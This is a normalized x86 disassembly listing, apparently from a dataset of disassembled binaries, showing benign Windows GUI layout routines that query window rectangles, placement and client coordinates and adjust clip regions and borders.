push [ fs : eax ]
mov [ fs : eax ] esp
cmp dl [ ebx + 0x1db ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3ab7fd3
lea eax [ ebp - 0x4 ]
call sub_3a66cb4
retn
mov [ ebx + 0x1db ] dl
test [ ebx + 0x1c ] 0x10
setne al
xor al 0x1
test al dl
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax ebx
mov si 0xffc5
call sub_3a6457c
mov edx [ ebp - 0x4 ]
lea eax [ ebx + 0x1b0 ]
call sub_3a66ccc
sub_3ab7fe4
push ebx
push esi
push edi
add esp 0xffffffc4
mov ebx eax
mov eax [ ebx + 0x1b4 ]
push eax
call IsIconic
test eax eax
je r-xdata
push esp
mov eax [ ebx + 0x1b4 ]
push eax
call GetWindowRect
mov [ esp + 0x10 ] 0x2c
lea eax [ esp + 0x10 ]
push eax
mov eax [ ebx + 0x1b4 ]
push eax
call GetWindowPlacement
lea esi [ esp + 0x2c ]
mov edi esp
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
jmp r-xdata
mov eax [ esp ]
mov [ ebx + 0x40 ] eax
mov eax [ esp + 0x4 ]
mov [ ebx + 0x44 ] eax
mov eax [ esp + 0x8 ]
sub eax [ esp ]
mov [ ebx + 0x48 ] eax
mov eax [ esp + 0xc ]
sub eax [ esp + 0x4 ]
mov [ ebx + 0x4c ] eax
mov eax ebx
call sub_3aaf08c
add esp 0x3c
pop edi
pop esi
pop ebx
retn
push 0xfffffff8
mov eax [ ebx + 0x1b4 ]
push eax
call GetWindowLongA
mov esi eax
test esi esi
je r-xdata
push 0xfffffff0
mov eax [ ebx + 0x1b4 ]
push eax
call GetWindowLongA
test eax 0x40000000
je r-xdata
push esp
push esi
call ScreenToClient
lea eax [ esp + 0x8 ]
push eax
push esi
call ScreenToClient
sub_3ab809c
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov [ esp ] edx
mov ebp eax
mov eax [ ebp + 0x1c8 ]
test eax eax
je r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
inc edi
mov [ esp + 0x4 ] 0x0
mov eax [ ebp + 0x1c8 ]
mov edx [ esp + 0x4 ]
call sub_3a7a494
mov ebx eax
mov edx ebx
mov eax [ esp ]
call sub_3a7a33c
mov edx [ esp ]
mov eax ebx
mov si 0xffb2
call sub_3a6457c
inc [ esp + 0x4 ]
dec edi
jne r-xdata
sub_3ab80fc
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov [ ebp - 0x5 ] cl
mov edi edx
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0xc ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a64350
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_3ab81f2
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
mov si 0xffb2
call sub_3a6457c
mov eax [ ebp - 0x14 ]
cmp [ eax + 0x8 ] 0x0
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3ab81f9
mov eax [ ebp - 0x14 ]
call sub_3a64380
retn
mov edx edi
mov eax [ ebp - 0x14 ]
call sub_3a7a4f0
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0xffffffff
jne r-xdata
mov ebx [ ebp - 0x10 ]
cmp [ ebp - 0x5 ] 0x0
je r-xdata
test ebx ebx
jne r-xdata
inc ebx
mov eax [ ebp - 0x14 ]
cmp ebx [ eax + 0x8 ]
jne r-xdata
xor eax eax
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x8 ]
dec eax
mov [ ebp - 0x10 ] eax
jmp r-xdata
dec ebx
mov eax [ ebp - 0x14 ]
mov ebx [ eax + 0x8 ]
mov edx ebx
mov eax [ ebp - 0x14 ]
call sub_3a7a494
mov edi eax
mov eax edi
mov si 0xffb6
call sub_3a6457c
test al al
je r-xdata
xor ebx ebx
jmp r-xdata
cmp [ ebp - 0xc ] 0x0
jne r-xdata
cmp [ ebp + 0xc ] 0x0
je r-xdata
cmp ebx [ ebp - 0x10 ]
jne r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
cmp [ edi + 0x1d8 ] 0x0
je r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov [ ebp - 0xc ] edi
mov eax [ edi + 0x30 ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
sub_3ab8208
push ebp
mov ebp esp
push esi
mov esi edx
mov edx [ ebp + 0x8 ]
push edx
xor dl 0x1
push edx
mov edx esi
call sub_3ab80fc
mov esi eax
test esi esi
je r-xdata
pop esi
pop ebp
retn 0x4
mov eax esi
mov edx [ eax ]
call [ edx + 0xd4 ]
sub_3ab8234
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_3ab3ba4
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
mov edx eax
mov eax [ ebp + 0xc ]
call [ ebp + 0x8 ]
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_3ab3b68
mov edx [ eax + 0x4 ]
cmp edx [ ebp - 0x8 ]
jne r-xdata
sub_3ab827c
push ebx
push esi
mov esi ecx
mov ebx edx
mov eax ebx
mov edx [ r-xdata ]
call sub_3a6450c
test al al
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_3a6450c
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_3ab78d4
pop esi
pop ebx
retn
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_3aafe2c
sub_3ab82c4
push ebp
mov ebp esp
push ebx
push esi
push edi
mov esi eax
mov eax [ esi + 0x74 ]
cmp [ eax + 0x14 ] 0x0
jbe r-xdata
xor ebx ebx
mov [ edx ] ebx
mov ebx [ esi + 0x74 ]
mov ebx [ ebx + 0x14 ]
mov [ edx ] ebx
jmp r-xdata
xor ebx ebx
mov [ ecx ] ebx
mov ebx [ esi + 0x74 ]
mov ebx [ ebx + 0x10 ]
mov [ ecx ] ebx
jmp r-xdata
cmp [ eax + 0x10 ] 0x0
jbe r-xdata
mov ebx [ ebp + 0xc ]
xor edi edi
mov [ ebx ] edi
mov ebx [ esi + 0x74 ]
mov ebx [ ebx + 0xc ]
mov edi [ ebp + 0xc ]
mov [ edi ] ebx
jmp r-xdata
cmp [ eax + 0xc ] 0x0
jbe r-xdata
mov eax [ ebp + 0x8 ]
xor ebx ebx
mov [ eax ] ebx
mov eax [ esi + 0x74 ]
mov eax [ eax + 0x8 ]
mov ebx [ ebp + 0x8 ]
mov [ ebx ] eax
jmp r-xdata
cmp [ eax + 0x8 ] 0x0
jbe r-xdata
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x38 ]
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
mov eax [ esi + 0x78 ]
mov eax [ eax + 0x8 ]
mov ebx [ esi + 0x78 ]
add eax [ ebx + 0x10 ]
cmp [ edx ] 0x0
jle r-xdata
test [ esi + 0x52 ] 0x10
je r-xdata
mov ebx [ ebp + 0xc ]
cmp eax [ ebx ]
jg r-xdata
add [ edx ] eax
mov eax [ esi + 0x78 ]
mov eax [ eax + 0xc ]
mov ebx [ esi + 0x78 ]
add eax [ ebx + 0x14 ]
cmp [ ecx ] 0x0
jle r-xdata
mov ebx [ ebp + 0xc ]
sub [ ebx ] eax
mov ebx [ ebp + 0x8 ]
cmp eax [ ebx ]
jg r-xdata
add [ ecx ] eax
mov ebx [ ebp + 0x8 ]
sub [ ebx ] eax
sub_3ab8388
push ebp
mov ebp esp
add esp 0xffffffa0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov eax esi
call sub_3ab7fd8
test al al
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov eax esi
call sub_3ab3ba4
test eax eax
je r-xdata
lea edx [ ebp - 0x5e ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea edx [ ebp - 0x5e ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x90 ]
lea eax [ ebp - 0x5e ]
push eax
call IsRectEmpty
test eax eax
jne r-xdata
mov eax [ esi + 0x78 ]
mov edx 0x2
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov edx [ ebp - 0x56 ]
sub edx [ ebp - 0x5e ]
sub eax edx
mov [ ebp - 0xc ] eax
mov eax [ esi + 0x78 ]
mov edx 0x3
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov edx [ ebp - 0x52 ]
sub edx [ ebp - 0x5a ]
sub eax edx
mov [ ebp - 0x10 ] eax
mov eax [ esi + 0x78 ]
mov edx 0x2
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov edx [ ebp - 0x56 ]
sub edx [ ebp - 0x5e ]
sub eax edx
mov [ ebp - 0x14 ] eax
mov eax [ esi + 0x78 ]
mov edx 0x3
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov edx [ ebp - 0x52 ]
sub edx [ ebp - 0x5a ]
sub eax edx
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
sub [ eax ] edx
mov eax [ ebp + 0xc ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x10 ]
sub [ eax ] edx
mov eax [ ebp + 0x8 ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp + 0xc ]
mov edx [ ebp - 0x14 ]
sub [ eax ] edx
xor eax eax
push ebp
push sub_3ab87fa
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ ebp - 0x20 ] eax
xor eax eax
mov [ ebp - 0x30 ] eax
xor eax eax
mov [ ebp - 0x24 ] eax
xor eax eax
mov [ ebp - 0x34 ] eax
xor eax eax
mov [ ebp - 0x28 ] eax
xor eax eax
mov [ ebp - 0x38 ] eax
xor eax eax
mov [ ebp - 0x2c ] eax
xor eax eax
mov [ ebp - 0x3c ] eax
mov eax esi
call sub_3ab3ba4
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x18 ]
sub [ eax ] edx
cmp [ ebp - 0x20 ] 0x0
jle r-xdata
inc edi
mov [ ebp - 0x1c ] 0x0
cmp [ ebp - 0x24 ] 0x0
jle r-xdata
mov eax [ ebp - 0x20 ]
add eax [ ebp - 0x30 ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx ]
jle r-xdata
lea eax [ ebp - 0x44 ]
push eax
lea eax [ ebp - 0x4c ]
push eax
lea ecx [ ebp - 0x48 ]
lea edx [ ebp - 0x40 ]
mov eax ebx
call sub_3ab82c4
movzx eax [ ebx + 0x5b ]
sub al 0x1
jb r-xdata
test [ ebx + 0x1c ] 0x10
je r-xdata
cmp [ ebp - 0x28 ] 0x0
jle r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax ] 0x0
je r-xdata
mov eax [ ebp - 0x20 ]
add eax [ ebp - 0x30 ]
mov edx [ ebp - 0x4 ]
mov [ edx ] eax
movzx eax [ ebx + 0x61 ]
and al [ r-xdata ]
movzx edx [ r-xdata ]
cmp dl al
jne r-xdata
sub al 0x2
jb r-xdata
inc [ ebp - 0x1c ]
dec edi
jne r-xdata
test [ ebx + 0x51 ] 0x4
jne r-xdata
cmp [ ebp - 0x2c ] 0x0
jle r-xdata
mov eax [ ebp - 0x28 ]
add eax [ ebp - 0x38 ]
mov edx [ ebp - 0x8 ]
cmp eax [ edx ]
jle r-xdata
mov eax [ ebp - 0x24 ]
add eax [ ebp - 0x34 ]
mov edx [ ebp + 0xc ]
mov [ edx ] eax
mov eax [ ebp - 0x24 ]
add eax [ ebp - 0x34 ]
mov edx [ ebp + 0xc ]
cmp eax [ edx ]
jle r-xdata
mov [ ebp - 0x4d ] 0x0
jmp r-xdata
mov [ ebp - 0x4d ] 0x1
cmp [ ebp - 0x40 ] 0x0
jle r-xdata
mov [ ebp - 0x4d ] 0x1
jmp r-xdata
sub al 0x2
je r-xdata
mov edx [ ebp - 0x1c ]
mov eax esi
call sub_3ab3b68
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax ] 0x0
je r-xdata
mov eax [ ebp - 0x28 ]
add eax [ ebp - 0x38 ]
mov edx [ ebp - 0x8 ]
mov [ edx ] eax
movzx eax [ ebx + 0x5b ]
sub al 0x1
jb r-xdata
cmp [ ebp - 0x44 ] 0x0
jle r-xdata
mov eax [ ebx + 0x78 ]
mov edx 0x2
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov edx [ ebp - 0x56 ]
sub edx [ ebp - 0x5e ]
sub edx eax
sub edx [ ebp - 0x40 ]
mov [ ebp - 0x40 ] edx
mov [ ebp - 0x4d ] 0x2
jmp r-xdata
jmp r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
add [ eax ] edx
mov eax [ ebp - 0x2c ]
add eax [ ebp - 0x3c ]
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
mov eax [ ebp - 0x2c ]
add eax [ ebp - 0x3c ]
mov edx [ ebp + 0x8 ]
cmp eax [ edx ]
jle r-xdata
movzx eax [ ebx + 0x61 ]
and al [ r-xdata ]
movzx edx [ r-xdata ]
cmp dl al
jne r-xdata
add al 0xfe
sub al 0x2
jb r-xdata
mov eax [ ebx + 0x78 ]
mov edx 0x2
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov edx [ ebp - 0x56 ]
sub edx [ ebp - 0x5e ]
add edx [ ebp - 0x44 ]
sub edx eax
mov [ ebp - 0x44 ] edx
jmp r-xdata
mov [ ebp - 0x4d ] 0x3
mov eax [ ebp + 0xc ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x10 ]
add [ eax ] edx
mov [ ebp - 0x4e ] 0x0
jmp r-xdata
mov [ ebp - 0x4e ] 0x1
cmp [ ebp - 0x48 ] 0x0
jle r-xdata
mov [ ebp - 0x4e ] 0x1
jmp r-xdata
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp + 0xc ]
mov edx [ ebp - 0x14 ]
add [ eax ] edx
movzx eax [ ebp - 0x4d ]
dec eax
sub al 0x2
jb r-xdata
cmp [ ebp - 0x4c ] 0x0
jle r-xdata
mov eax [ ebx + 0x78 ]
mov edx 0x3
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov edx [ ebp - 0x52 ]
sub edx [ ebp - 0x5a ]
sub edx eax
sub edx [ ebp - 0x48 ]
mov [ ebp - 0x48 ] edx
mov [ ebp - 0x4e ] 0x2
jmp r-xdata
jmp r-xdata
retn
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x18 ]
add [ eax ] edx
cmp [ ebp - 0x40 ] 0x0
jle r-xdata
je r-xdata
mov eax [ ebx + 0x78 ]
mov edx 0x3
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov edx [ ebp - 0x52 ]
sub edx [ ebp - 0x5a ]
add edx [ ebp - 0x4c ]
sub edx eax
mov [ ebp - 0x4c ] edx
jmp r-xdata
mov [ ebp - 0x4e ] 0x3
cmp [ ebp - 0x44 ] 0x0
jle r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
cmp eax [ ebp - 0x40 ]
jge r-xdata
mov eax [ ebx + 0x78 ]
mov edx 0x2
mov ecx [ eax ]
call [ ecx + 0x10 ]
add [ ebp - 0x30 ] eax
mov eax [ ebx + 0x78 ]
mov edx 0x2
mov ecx [ eax ]
call [ ecx + 0x10 ]
add [ ebp - 0x34 ] eax
jmp r-xdata
movzx eax [ ebp - 0x4e ]
dec eax
sub al 0x2
jb r-xdata
mov eax [ ebp + 0xc ]
mov eax [ eax ]
cmp eax [ ebp - 0x44 ]
jle r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x40 ]
mov [ eax ] edx
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
cmp eax [ ebp - 0x20 ]
jle r-xdata
cmp [ ebp - 0x48 ] 0x0
jle r-xdata
je r-xdata
mov eax [ ebp + 0xc ]
mov edx [ ebp - 0x44 ]
mov [ eax ] edx
mov eax [ ebp + 0xc ]
mov eax [ eax ]
cmp eax [ ebp - 0x24 ]
jle r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
mov [ ebp - 0x20 ] eax
cmp [ ebp - 0x4c ] 0x0
jle r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
cmp eax [ ebp - 0x48 ]
jge r-xdata
mov eax [ ebx + 0x78 ]
mov edx 0x3
mov ecx [ eax ]
call [ ecx + 0x10 ]
add [ ebp - 0x38 ] eax
mov eax [ ebx + 0x78 ]
mov edx 0x3
mov ecx [ eax ]
call [ ecx + 0x10 ]
add [ ebp - 0x3c ] eax
jmp r-xdata
mov eax [ ebp + 0xc ]
mov eax [ eax ]
mov [ ebp - 0x24 ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
cmp eax [ ebp - 0x4c ]
jle r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x48 ]
mov [ eax ] edx
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
cmp eax [ ebp - 0x28 ]
jle r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x4c ]
mov [ eax ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
cmp eax [ ebp - 0x2c ]
jle r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x2c ] eax
jmp r-xdata
sub_3ab8811
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_3ab8388
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_3ab0d14
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
sub_3ab8850
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_3ab2138
mov eax esi
mov edx [ r-xdata ]
call sub_3a6450c
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
test bl bl
je r-xdata
mov edx [ esi + 0x74 ]
mov eax edi
call sub_3aaf468
cmp [ edi + 0x160 ] 0x0
jne r-xdata
sub_3ab8898
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_3ab235c
mov eax esi
mov edx [ r-xdata ]
call sub_3a6450c
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx [ ebx + 0x160 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x48 ]
sub_3ab88c8
push ebp
mov ebp esp
add esp 0xffffffcc
push ebx
push esi
push edi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov [ ebp - 0xd ] 0x1
mov eax [ ebp - 0x4 ]
call sub_3ab7fd8
test al al
je r-xdata
movzx eax [ ebp - 0xd ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x5b ] 0x5
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
lea edx [ ebp - 0x24 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xc0 ]
lea edx [ ebp - 0x34 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea edx [ ebp - 0x34 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x90 ]
mov eax [ ebp - 0x4 ]
call sub_3ab36c0
xor edx edx
push ebp
push sub_3ab89f6
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
call sub_3ab3ba4
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov eax [ ebp - 0x4 ]
call sub_3ab3ba4
test eax eax
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3ab89fd
mov eax [ ebp - 0x4 ]
and [ eax + 0x54 ] 0xffef
mov eax [ ebp - 0x4 ]
call sub_3ab36c8
retn
inc ebx
mov [ ebp - 0x14 ] 0x0
mov edx [ ebp - 0x4 ]
movzx edx [ edx + 0x5b ]
test dl dl
je r-xdata
test [ eax + 0x1c ] 0x10
je r-xdata
mov esi [ ebp - 0x24 ]
sub esi [ ebp - 0x34 ]
jmp r-xdata
add dl 0xfd
sub dl 0x2
jae r-xdata
inc [ ebp - 0x14 ]
dec ebx
jne r-xdata
test [ eax + 0x51 ] 0x4
jne r-xdata
mov edx [ ebp - 0x4 ]
movzx edx [ edx + 0x5b ]
sub dl 0x3
jae r-xdata
xor esi esi
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_3ab3b68
cmp [ eax + 0x57 ] 0x0
jne r-xdata
xor edi edi
mov edi [ ebp - 0x20 ]
sub edi [ ebp - 0x30 ]
jmp r-xdata
mov edx [ eax + 0x48 ]
push edx
mov edx [ eax + 0x4c ]
push edx
mov ecx [ eax + 0x44 ]
sub ecx edi
mov edx [ eax + 0x40 ]
sub edx esi
mov esi [ eax ]
call [ esi + 0x88 ]
sub_3ab89fd
mov eax [ ebp - 0x4 ]
movzx edx [ eax + 0x5b ]
mov eax edx
test al al
je r-xdata
mov eax [ ebp - 0x1c ]
sub eax [ ebp - 0x24 ]
test eax eax
jle r-xdata
add al 0xfd
sub al 0x2
jae r-xdata
mov eax [ ebp - 0x8 ]
xor edx edx
mov [ eax ] edx
mov ecx [ ebp - 0x4 ]
add eax [ ecx + 0x48 ]
mov ecx [ ebp - 0x2c ]
sub ecx [ ebp - 0x34 ]
sub eax ecx
mov ecx [ ebp - 0x8 ]
mov [ ecx ] eax
cmp dl 0x4
jne r-xdata
mov eax [ ebp - 0x4 ]
movzx edx [ eax + 0x5b ]
mov eax edx
sub al 0x3
jae r-xdata
movzx eax [ ebp - 0xd ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x18 ]
sub eax [ ebp - 0x20 ]
test eax eax
jle r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x5c ]
jmp r-xdata
mov eax [ ebp - 0xc ]
xor edx edx
mov [ eax ] edx
mov ecx [ ebp - 0x4 ]
add eax [ ecx + 0x4c ]
mov ecx [ ebp - 0x28 ]
sub ecx [ ebp - 0x30 ]
sub eax ecx
mov ecx [ ebp - 0xc ]
mov [ ecx ] eax
cmp dl 0x2
jne r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x5c ]
jmp r-xdata
sub_3ab8a90
sub edx 0x1
jb r-xdata
cmp cl [ eax + 0x193 ]
je r-xdata
je r-xdata
retn
mov [ eax + 0x193 ] cl
push 0x0
xor ecx ecx
mov edx 0xb03b
call sub_3ab0e78
retn
cmp cl [ eax + 0x194 ]
je r-xdata
jmp r-xdata
mov [ eax + 0x194 ] cl
push 0x0
xor ecx ecx
mov edx 0xb03b
call sub_3ab0e78
sub_3ab8ad4
push ebx
push ecx
mov [ esp ] dl
mov ebx eax
movzx eax [ ebx + 0x192 ]
cmp al [ esp ]
je r-xdata
pop edx
pop ebx
retn
movzx eax [ esp ]
mov [ ebx + 0x192 ] al
push 0x0
xor ecx ecx
mov edx 0xb03b
mov eax ebx
call sub_3ab0e78
sub_3ab8b44
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax [ esi + 0x8 ]
mov esi eax
mov eax [ ebx + 0x19c ]
neg eax
push eax
mov edx [ ebx + 0x19c ]
neg edx
push eax
mov edi esi
push edi
call InflateRect
cmp [ ebx + 0x195 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
retn
xor eax eax
cmp [ ebx + 0x193 ] 0x0
je r-xdata
cmp [ ebx + 0x194 ] 0x0
je r-xdata
add eax [ ebx + 0x198 ]
mov esi edi
test [ ebx + 0x192 ] 0x1
je r-xdata
add eax [ ebx + 0x198 ]
test [ ebx + 0x192 ] 0x2
je r-xdata
add [ esi ] eax
test [ ebx + 0x192 ] 0x4
je r-xdata
add [ esi + 0x4 ] eax
test [ ebx + 0x192 ] 0x8
je r-xdata
sub [ esi + 0x8 ] eax
sub [ esi + 0xc ] eax
sub_3ab8bd4
push ebp
mov ebp esp
add esp 0xffffffc4
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x195 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_3ab7c38
push eax
call GetWindowDC
mov [ ebp - 0xc ] eax
xor ecx ecx
push ebp
push sub_3ab8e87
push [ fs : ecx ]
mov [ fs : ecx ] esp
lea eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x4 ]
call sub_3ab7c38
push eax
call GetClientRect
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0x4 ]
call sub_3ab7c38
push eax
call GetWindowRect
push 0x2
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0x4 ]
call sub_3ab7c38
push eax
push 0x0
call MapWindowPoints
mov eax [ ebp - 0x28 ]
neg eax
push eax
mov eax [ ebp - 0x2c ]
neg eax
push eax
lea eax [ ebp - 0x1c ]
push eax
call OffsetRect
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0xc ]
push eax
call ExcludeClipRect
lea esi [ ebp - 0x2c ]
lea edi [ ebp - 0x3c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x19c ]
push eax
push eax
lea eax [ ebp - 0x1c ]
push eax
call InflateRect
lea esi [ ebp - 0x1c ]
lea edi [ ebp - 0x2c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
push 0xfffffff0
mov eax [ ebp - 0x4 ]
call sub_3ab7c38
push eax
call GetWindowLongA
mov ebx eax
test ebx 0x200000
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x19c ] 0x0
jbe r-xdata
test ebx 0x100000
je r-xdata
push 0x14
mov eax [ rw-data ]
mov eax [ eax ]
call eax
add [ ebp - 0x24 ] eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_3abe5d0
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x195 ] 0x0
je r-xdata
push 0x15
mov eax [ rw-data ]
mov eax [ eax ]
call eax
add [ ebp - 0x20 ] eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
test [ eax + 0x52 ] 0x2
je r-xdata
mov eax [ ebp - 0x20 ]
push eax
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebp - 0x28 ]
push eax
mov eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0xc ]
push eax
call IntersectClipRect
lea esi [ ebp - 0x3c ]
lea edi [ ebp - 0x2c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
cmp eax 0x1
jne r-xdata
xor esi esi
mov eax [ ebp - 0x4 ]
movzx edx [ eax + 0x193 ]
test dl dl
je r-xdata
call sub_3abdd24
xor ecx ecx
mov edx [ ebp - 0x4 ]
call sub_3abe448
lea edx [ ebp - 0x1c ]
push edx
mov edx [ ebp - 0x8 ]
push eax
call GetRgnBox
push 0x2
lea eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x4 ]
call sub_3ab7c38
push eax
push 0x0
call MapWindowPoints
lea eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x2c ]
push eax
lea eax [ ebp - 0x2c ]
push eax
call IntersectRect
